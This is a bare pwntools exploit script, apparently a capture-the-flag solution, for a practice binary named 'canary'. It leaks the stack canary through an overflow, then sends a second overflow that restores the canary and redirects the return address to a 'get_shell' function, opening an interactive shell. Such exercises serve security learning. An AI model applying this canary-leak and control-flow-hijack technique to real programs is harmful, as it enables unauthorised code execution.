from pwn import *

elf = ELF("./canary")

p = elf.process()

payload = b"A"
payload += b"A" * 0x108
payload += b"B"
p.send(payload)

p.recv(0x108)
p.recv(1) #'B'
canary = u64(b"\x00"+ p.recv(0x7))

log.info(f"canary @ {canary:#x}")

payload = b""
payload += b"A" * 0x100
payload += b"B" * 0x8
payload += p64(canary)
payload += b"C" * 0x100
payload += p64(elf.sym["get_shell"])    #RET
p.send(payload)

p.interactive()
